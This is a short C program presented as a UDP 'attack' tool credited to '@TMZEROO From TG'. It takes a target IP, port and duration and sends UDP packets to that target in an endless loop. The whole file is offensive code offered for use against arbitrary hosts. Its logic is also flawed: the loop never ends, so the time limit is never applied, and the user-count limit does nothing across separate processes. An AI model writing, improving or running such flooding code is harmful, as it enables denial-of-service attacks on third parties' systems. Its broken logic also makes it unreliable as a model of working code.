#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>

#define MAX_USERS 15
#define MAX_TIME 1000 // Maximum attack time in seconds
#define BUFFER_SIZE 1024

// Global variable to keep track of the active user count
static volatile int user_count = 0;

// Signal handler to clean up when a user ends
void handle_sigint(int sig) {
    // Decrement the user count on termination
    __sync_fetch_and_sub(&user_count, 1);
    printf("\nUser disconnected. Active users: %d\n", user_count);
    exit(0);
}

void send_udp_packets(const char* ip, int port) {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    printf("Sending UDP packets to %s:%d\n", ip, port);
    while (1) {
        // Send UDP packet
        snprintf(buffer, sizeof(buffer), "Attack packet from TMZEROO");
        sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
        usleep(100000); // Sleep for 100 milliseconds
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    // Validate time
    if (time <= 0 || time > MAX_TIME) {
        printf("Time must be between 1 and %d seconds.\n", MAX_TIME);
        return 1;
    }

    // Check user limit (max 15 users)
    if (__sync_fetch_and_add(&user_count, 1) > MAX_USERS) {
        printf("Maximum user limit reached. Please try again later.\n");
        return 1;
    }

    // Handle SIGINT to decrement user count on exit
    signal(SIGINT, handle_sigint);

    printf("Attack started by @TMZEROO From TG\n");

    // Start sending UDP packets
    send_udp_packets(ip, port);

    // Wait for the specified time
    sleep(time);

    // Clean up and exit
    __sync_fetch_and_sub(&user_count, 1);
    printf("Attack ended after %d seconds.\n", time)
      ;
    return 0;
}
